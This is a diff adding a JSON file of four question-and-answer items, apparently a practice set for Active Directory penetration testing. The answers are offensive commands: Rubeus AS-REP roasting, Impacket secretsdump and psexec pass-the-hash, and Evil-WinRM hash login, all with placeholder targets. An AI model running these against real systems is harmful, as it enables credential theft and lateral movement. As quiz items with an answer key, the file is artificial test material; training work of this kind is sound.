@@ -1,0 +1,48 @@
+[
+  {
+    "question": [
+      "Use Rubeus for AS-REP roasting and save output.",
+      "Output file = asrep.txt",
+      "Format = hashcat"
+    ],
+    "answer": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
+    "alternate_answers": [
+      "Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat"
+    ]
+  },
+  {
+    "question": [
+      "Dump AD secrets remotely with Impacket using username/password.",
+      "Domain = <domain>",
+      "Username = <user>",
+      "Password = <pass>",
+      "Domain Controller IP = <IP>"
+    ],
+    "answer": "secretsdump.py <domain>/<user>:<pass>@<IP>"
+  },
+  {
+    "question": [
+      "Use Impacket psexec with hash auth for lateral movement.",
+      "Domain = <domain>",
+      "Username = <user>",
+      "NTLM hash = <hash>",
+      "Target = <IP>"
+    ],
+    "answer": "psexec.py -hashes :<hash> <domain>/<user>@<IP>",
+    "alternate_answers": [
+      "psexec.py <domain>/<user>@<IP> -hashes :<hash>"
+    ]
+  },
+  {
+    "question": [
+      "Use Evil-WinRM with hash authentication.",
+      "Target = <IP>",
+      "Username = <user>",
+      "NTLM hash = <hash>"
+    ],
+    "answer": "evil-winrm -i <IP> -u <user> -H <hash>",
+    "alternate_answers": [
+      "evil-winrm -u <user> -H <hash> -i <IP>"
+    ]
+  }
+]
